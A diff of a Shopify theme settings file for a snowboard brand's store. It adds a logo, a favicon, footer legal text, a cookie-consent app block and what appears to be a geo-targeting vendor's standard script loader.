@@ -1,6 +1,8 @@
 {
   "current": {
+    "logo": "shopify:\/\/shop_images\/logo-capita.png",
     "logo_width": 90,
+    "favicon": "shopify:\/\/shop_images\/capita_logo_webshare_R2.jpg",
     "colors_solid_button_labels": "#ffffff",
     "colors_accent_1": "#121212",
     "gradient_accent_1": "",
@@ -126,6 +128,8 @@
     "show_vendor": false,
     "show_cart_note": false,
     "cart_drawer_collection": "",
+    "script_pre_body_close": "<script>\n(function(g,e,o,t,a,r,ge,tl,y){\nt=g.getElementsByTagName(e)[0];y=g.createElement(e);y.async=true;\ny.src='https:\/\/g594253006.co\/gj.js?id=-NdK1DmdD-Rt3RHVgOAU&refurl='+g.referrer+'&winurl='+encodeURIComponent(window.location);\nt.parentNode.insertBefore(y,t);\n})(document,'script');\n<\/script>",
+    "footer_legal": "© 2020-2023 CAPiTA Snowboards | Core S.r.l. – Via Colombano 10, 23014 Delebio (SO), Italy - VAT nr. IT00838030146 All rights reserved. Operated by C3 Worldwide LLC - 4917 14th Ave NW, Seattle, WA 98107 USA",
     "sections": {
       "main-password-header": {
         "type": "main-password-header",
@@ -137,6 +141,17 @@
         "type": "main-password-footer",
         "settings": {
           "color_scheme": "background-1"
+        }
+      }
+    },
+    "content_for_index": [
+
+    ],
+    "blocks": {
+      "2153490007123654574": {
+        "type": "shopify:\/\/apps\/consentmo-gdpr\/blocks\/gdpr_cookie_consent\/4fbe573f-a377-4fea-9801-3ee0858cae41",
+        "disabled": false,
+        "settings": {
         }
       }
     }
